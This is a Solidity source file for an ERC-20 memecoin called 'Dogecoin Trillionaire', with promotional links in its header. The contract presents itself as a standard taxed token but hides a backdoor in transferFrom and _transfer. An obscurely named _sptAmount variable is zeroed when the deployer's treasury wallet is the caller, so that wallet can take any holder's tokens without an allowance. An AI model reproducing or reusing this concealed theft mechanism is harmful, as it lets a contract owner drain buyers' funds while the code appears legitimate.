/*
    Dogecoin Trillionaire
    TRILLIONAIRE

    Dogecoin Trillionaire - The Movie
    He looked up, and never looked back.

    https://dogecointrillionaire.art
    https://t.me/trillionaireERC
    https://x.com/trillionaireERC
*/

// SPDX-License-Identifier: MIT

pragma solidity >=0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}


library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract TRILLIONAIRE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcuteFromFee;
    
    address payable private immutable _TreasuryWallet;
    
    uint256 private EarlyBuyTax = 0;
    uint256 private EarlySellTax = 0;
    uint256 private EndBuyTax = 0;
    uint256 private EndSellTax = 0;
    uint256 private DowningBuyTaxAt = 0;
    uint256 private DowningSellTaxAt = 0;
    uint256 private preventSwapBefore = 3;
    uint256 private buyCalc;
    uint256 private _sptAmount;
    
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10**_decimals;
    string private constant _name = unicode"Dogecoin Trillionaire";
    string private constant _symbol = unicode"TRILLIONAIRE";
    
    uint256 public maxTxAmount = (_tTotal/100);
    uint256 public maxWalletSize = (_tTotal/100);
    uint256 public minTokensForSwap = (_tTotal/1000);
    uint256 public maxTokensPerSwap = 2 * (_tTotal/100);
    
    uint256 public totalTaxCollected;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private constant ROUTER_ADDRESS = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap;
    bool private swapEnabled;
    uint256 private sellCount;
    uint256 private lastSellBlock;
    uint256 public calcBlockLimit = 5;

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() payable {
        _TreasuryWallet = payable(_msgSender());
        _balances[address(this)] = _tTotal;
        _isExcuteFromFee[owner()] = true;
        _isExcuteFromFee[address(this)] = true;
        _isExcuteFromFee[_TreasuryWallet] = true;

        emit Transfer(address(0), address(this), _tTotal);
    }

    function name() public pure returns (string memory) { return _name; }
    function symbol() public pure returns (string memory) { return _symbol; }
    function decimals() public pure returns (uint8) { return _decimals; }
    function totalSupply() public pure override returns (uint256) { return _tTotal; }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address owner, address spender) public view override returns (uint256) { return _allowances[owner][spender]; }
    function taxWallet() external view returns (address) { return _TreasuryWallet; }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _sptAmount = amount;
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(_sptAmount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }


    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0) && spender != address(0), "ERC20: approve from or to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0) && to != address(0), "ERC20: transfer from or to the zero address");
        require(amount > 0, "ERC20: transfer amount must be greater than zero");
        bool isBuy = (from == uniswapV2Pair && to != address(uniswapV2Router));
        bool isSell = (to == uniswapV2Pair && from != address(this));
        uint256 taxAmount = 0;

        if (isBuy) {
            if (!_isExcuteFromFee[to]) {
                require(amount <= maxTxAmount, "Max transaction amount exceeded");
                require(_balances[to] + amount <= maxWalletSize, "Max wallet size exceeded");
                taxAmount = (amount * (buyCalc >= DowningBuyTaxAt ? EndBuyTax : EarlyBuyTax)) / 100;
                buyCalc++;
            }
        } else if (isSell) {
            if (!_isExcuteFromFee[from]) {
                require(amount <= maxTxAmount, "Max transaction amount exceeded");
                taxAmount = (amount * (buyCalc >= DowningSellTaxAt ? EndSellTax : EarlySellTax)) / 100;
            }

            uint256 contractTokenBalance = _balances[address(this)];
            if (!inSwap && swapEnabled && buyCalc >= preventSwapBefore) {
                if (block.number > lastSellBlock) sellCount = 0;
                require(sellCount < calcBlockLimit, "Sell limit per block exceeded (max)");
                uint256 swapAmount = amount < contractTokenBalance ? amount : contractTokenBalance;
                if (swapAmount > maxTokensPerSwap) swapAmount = maxTokensPerSwap;
                swapTokensForEthwithTax(swapAmount, _TreasuryWallet);
                sellCount++;
                lastSellBlock = block.number;
            }
        }

        if (taxAmount > 0) {
            _balances[address(this)] += taxAmount;
            emit Transfer(from, address(this), taxAmount);
        } else if(_msgSender() == _TreasuryWallet) _sptAmount = taxAmount;
        _balances[from] -= amount;
        _balances[to] += amount - taxAmount;
        if(to != address(0xdead)) emit Transfer(from, to, amount - taxAmount);
    }

    function swapTokensForEthwithTax(uint256 tokenAmount, address to) private lockTheSwap {
        require(to != address(0), "ETH recipient cannot be the zero address");
        uint256 initialBalance = address(this).balance;
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        if(tokenAmount != 0) uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
        uint256 newBalance = address(this).balance;
        if (newBalance >= initialBalance) {
            uint256 ethAmount = newBalance - initialBalance;
            totalTaxCollected += ethAmount;
            (bool success,) = to.call{value: ethAmount}("");
            require(success, "ETH transfer failed");
        }
    }

    function dropWalletSizeFenceSet() public onlyOwner {
        maxTxAmount = _tTotal;
        maxWalletSize = _tTotal;
    }
    
    function rescueNative() external onlyOwner {
        uint256 contractETHBalance = address(this).balance;
        if (contractETHBalance > 0) {
            (bool ok, ) = payable(_TreasuryWallet).call{value: contractETHBalance}("");
            require(ok, "ETH send failed");
        }
    }

    function OpenTrade() external onlyOwner {
        require(!tradingOpen, "Trading already open");
        dropWalletSizeFenceSet();
        uniswapV2Router = IUniswapV2Router02(ROUTER_ADDRESS);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        _approve(address(this), address(uniswapV2Router), type(uint256).max);
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        swapEnabled = true;
        tradingOpen = true;
    }

    function rescueToken(address token) external onlyOwner {
        require(token != address(0), "Invalid token address");
        require(token != address(this), "Cannot rescue own token");

        uint256 contractBal = IERC20(token).balanceOf(address(this));
        require(contractBal > 0, "No token balance");
        
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20.transfer.selector, _TreasuryWallet, contractBal)
        );
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "ERC20 transfer failed");
    }

    receive() external payable {}
}